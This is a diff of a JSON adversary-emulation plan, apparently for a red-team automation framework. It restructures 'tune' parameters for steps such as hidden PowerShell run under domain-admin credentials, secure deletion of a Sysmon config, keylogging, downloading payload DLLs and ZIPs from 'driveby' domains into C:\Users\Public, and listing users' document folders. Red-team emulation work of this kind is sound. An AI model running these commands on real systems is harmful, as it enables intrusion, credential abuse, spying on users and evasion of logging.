@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -72,7 +78,8 @@
                 "payload": "self.tool_name2",
                 "driveby": "self.driveby2",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
             "label": "Interfaces3",
             "preconditions": {
                 "driveby": "self.driveby3"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -88,7 +96,8 @@
             "label": "DNS3",
             "preconditions": {
                 "driveby": "self.driveby3"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -98,7 +107,8 @@
                 "payload": "self.tool_name3",
                 "driveby": "self.driveby3",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -106,7 +116,8 @@
             "label": "Interfaces4",
             "preconditions": {
                 "driveby": "self.driveby4"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -114,7 +125,8 @@
             "label": "DNS4",
             "preconditions": {
                 "driveby": "self.driveby4"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -124,7 +136,8 @@
                 "payload": "self.tool_name4",
                 "driveby": "self.driveby4",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -132,7 +145,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -143,7 +157,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -154,7 +169,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -164,10 +180,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -178,7 +194,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Collection",
@@ -188,7 +205,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Collection",
@@ -197,10 +215,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "keylog_timer": 300000
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "keylog_timer": 300000
             }
         },
         {
@@ -210,13 +228,13 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "file_store_server": "self.driveby_domain2",
-                    "file_name": "self.tool_name2",
-                    "output_directory": "C:\\Users\\Public",
-                    "output_file_name": "nkkit.zip"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "file_store_server": "self.driveby_domain2",
+                "file_name": "self.tool_name2",
+                "output_directory": "C:\\Users\\Public",
+                "output_file_name": "nkkit.zip"
             }
         },
         {
@@ -226,10 +244,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{C:\\Users\\Public\\nkkit\\Sysmon64.exe -i C:\\Users\\Public\\nkkit\\sysmonconfig-export.xml;}'};echo 'Installed Sysmon';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{C:\\Users\\Public\\nkkit\\Sysmon64.exe -i C:\\Users\\Public\\nkkit\\sysmonconfig-export.xml;}'};echo 'Installed Sysmon';}"
             }
         },
         {
@@ -239,10 +257,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{C:\\Users\\Public\\nkkit\\sdelete64.exe -p5 C:\\Users\\Public\\nkkit\\sysmonconfig-export.xml}'}; echo 'Removed Sysmon config'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{C:\\Users\\Public\\nkkit\\sdelete64.exe -p5 C:\\Users\\Public\\nkkit\\sysmonconfig-export.xml}'}; echo 'Removed Sysmon config'}"
             }
         },
         {
@@ -252,10 +270,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "net share"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "net share"
             }
         },
         {
@@ -266,7 +284,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -275,13 +294,13 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "file_store_server": "self.driveby_domain3",
-                    "file_name": "self.tool_name3",
-                    "output_directory": "C:\\Users\\Public",
-                    "output_file_name": "popup.dll"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "file_store_server": "self.driveby_domain3",
+                "file_name": "self.tool_name3",
+                "output_directory": "C:\\Users\\Public",
+                "output_file_name": "popup.dll"
             }
         },
         {
@@ -291,11 +310,11 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "file_name": "C:\\Users\\Public\\popup.dll",
-                    "entry_point": "Main"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "file_name": "C:\\Users\\Public\\popup.dll",
+                "entry_point": "Main"
             }
         },
         {
@@ -305,10 +324,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Desktop| Sort-Object -property lastwritetime; echo 'User Desktop Directory Listing Complete';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Desktop| Sort-Object -property lastwritetime; echo 'User Desktop Directory Listing Complete';}"
             }
         },
         {
@@ -318,10 +337,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Downloads| Sort-Object -property lastwritetime; echo 'User Downloads Directory Listing Complete';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Downloads| Sort-Object -property lastwritetime; echo 'User Downloads Directory Listing Complete';}"
             }
         },
         {
@@ -331,10 +350,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Documents| Sort-Object -property lastwritetime; echo 'User Documents Directory Listing Complete';}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Documents| Sort-Object -property lastwritetime; echo 'User Documents Directory Listing Complete';}"
             }
         },
         {
@@ -344,13 +363,13 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "file_store_server": "self.driveby_domain4",
-                    "file_name": "self.tool_name4",
-                    "output_directory": "C:\\Users\\Public",
-                    "output_file_name": "TaskMon.zip"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "file_store_server": "self.driveby_domain4",
+                "file_name": "self.tool_name4",
+                "output_directory": "C:\\Users\\Public",
+                "output_file_name": "TaskMon.zip"
             }
         },
         {
@@ -360,10 +379,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{Expand-Archive C:\\Users\\Public\\TaskMon.zip -DestinationPath C:\\Users\\Public\\TaskMon; echo 'Unzip Complete'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{Expand-Archive C:\\Users\\Public\\TaskMon.zip -DestinationPath C:\\Users\\Public\\TaskMon; echo 'Unzip Complete'}"
             }
         },
         {
@@ -373,10 +392,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{Remove-Item C:\\Users\\Public\\TaskMon.zip; echo 'Removed ZIP Tools'}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{Remove-Item C:\\Users\\Public\\TaskMon.zip; echo 'Removed ZIP Tools'}"
             }
         },
         {
@@ -387,7 +406,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -397,7 +417,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
